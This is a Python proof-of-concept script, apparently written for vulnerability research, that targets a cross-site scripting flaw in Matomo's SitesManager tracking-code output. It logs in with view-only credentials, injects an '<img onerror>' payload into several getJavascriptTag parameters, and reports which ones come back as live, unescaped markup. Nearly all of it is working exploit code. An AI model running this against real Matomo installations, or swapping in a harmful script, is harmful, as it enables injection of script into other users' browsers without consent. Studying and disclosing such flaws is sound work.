#!/usr/bin/env python3
"""
Live PoC: SitesManager.getJavascriptTag options are inserted into the tracking-code
HTML *after* htmlentities(), so four of its parameters reach
plugins/SitesManager/templates/_matomoTabInstructions.twig -> {{ jsTag|raw }}
and the SiteWithoutData Vue component (<VueEntryContainer :html>) as live markup.

Run against a Matomo instance where you hold *view* access on idSite=1.
"""
import sys, json, urllib.parse, http.cookiejar, urllib.request, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8400/index.php"
USER = sys.argv[2] if len(sys.argv) > 2 else "viewer"
PASS = sys.argv[3] if len(sys.argv) > 3 else "UserPass123!x"
PAYLOAD = '<img src=x onerror=alert(1)>'

def login():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    html = op.open(BASE + "?module=Login&action=index").read().decode('utf8', 'replace')
    nonce = re.search(r'name="form_nonce"[^>]*value="([^"]+)"', html).group(1)
    op.open(BASE, urllib.parse.urlencode({
        'form_login': USER, 'form_password': PASS, 'form_nonce': nonce,
        'module': 'Login', 'action': 'index'}).encode())
    return op

CASES = {
    'excludedReferrers':            {'excludedReferrers': PAYLOAD},
    'excludedQueryParams':          {'excludedQueryParams': PAYLOAD},
    'customCampaignNameQueryParam': {'customCampaignNameQueryParam': PAYLOAD},
    'customCampaignKeywordParam':   {'customCampaignKeywordParam': PAYLOAD},
    'visitorCustomVariables':       {'visitorCustomVariables[0][0]': PAYLOAD,
                                     'visitorCustomVariables[0][1]': PAYLOAD},
    'piwikUrl (control, sanitized)': {'piwikUrl': 'http://x/' + PAYLOAD},
}

op = login()
print(f"{'parameter':32s} raw <img> in tab content?")
for label, extra in CASES.items():
    q = {'module': 'SitesManager', 'action': 'getTrackingMethodsForSite',
         'idSite': '1', 'period': 'day', 'date': 'today'}
    q.update(extra)
    data = json.loads(op.open(BASE + '?' + urllib.parse.urlencode(q), timeout=120)
                      .read().decode('utf8', 'replace'))
    hit = ''
    for _, tm in data['trackingMethods'].items():
        c = tm.get('content', '') or ''
        if PAYLOAD in c:
            i = c.find(PAYLOAD)
            hit = c[max(0, i - 80):i + 45].replace('\n', ' ')
            break
    print(f"{label:32s} {'YES  ' if hit else 'no   '} {hit[:120]}")
